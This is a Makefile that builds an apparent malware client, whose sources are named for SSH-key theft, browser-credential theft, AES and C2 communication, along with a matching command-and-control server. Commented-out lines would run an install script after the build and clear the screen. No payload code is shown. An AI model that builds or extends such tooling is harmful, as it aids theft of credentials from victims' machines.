# === Compiler and paths ===
CC      := gcc
SRC_DIR := src
INC_DIR := include
CFLAGS  := -Wall -Wextra -I$(INC_DIR)
LDFLAGS :=

# === Source Files ===
CLIENT_SRC := $(SRC_DIR)/ssheesh.c $(SRC_DIR)/c2.c $(SRC_DIR)/aes.c $(SRC_DIR)/stealSSH.c $(SRC_DIR)/browserCred.c
SERVER_SRC := $(SRC_DIR)/C2Server.c $(SRC_DIR)/aes.c

BIN_CLIENT := ssheesh
BIN_SERVER := c2server

INSTALL_SCRIPT := install.sh

# === Targets ===
.PHONY: all clean DEBUG

all: $(BIN_CLIENT) $(BIN_SERVER)
	@echo "[*] Build complete."
# uncomment the following lines to enable installation script execution
#	@chmod +x $(INSTALL_SCRIPT)
#	@./$(INSTALL_SCRIPT)
#	@clear
	@echo "[*] Installation complete."

$(BIN_CLIENT): $(CLIENT_SRC)
	$(CC) $(CFLAGS) $(DEBUG_FLAGS) $^ -o $@ $(LDFLAGS)

$(BIN_SERVER): $(SERVER_SRC)
	$(CC) $(CFLAGS) $(DEBUG_FLAGS) $^ -o $@ $(LDFLAGS) -pthread

clean:
	rm -f $(BIN_CLIENT) $(BIN_SERVER)

# === Debug Build Shortcut ===
DEBUG:
	$(MAKE) DEBUG_FLAGS="-DDEBUG -g"
